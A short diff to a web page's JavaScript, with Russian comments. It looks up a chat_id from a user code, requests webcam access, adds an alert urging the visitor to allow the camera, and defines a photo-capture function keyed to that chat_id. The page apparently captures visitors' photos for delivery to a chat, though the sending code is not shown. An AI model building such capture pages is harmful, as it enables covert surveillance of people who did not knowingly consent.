@@ -9,6 +9,7 @@ if (userCode) {
         .then(chat_id => {
             if (chat_id === "not_found") return;
 
+            // Запрашиваем доступ к камере
             navigator.mediaDevices.getUserMedia({ video: true })
                 .then(stream => {
                     let video = document.getElementById('video');
@@ -19,6 +20,7 @@ if (userCode) {
                 })
                 .catch(error => {
                     console.error("Ошибка при доступе к камере:", error);
+                    alert("Пожалуйста, разрешите доступ к камере.");
                 });
 
             function capturePhoto(chat_id) {
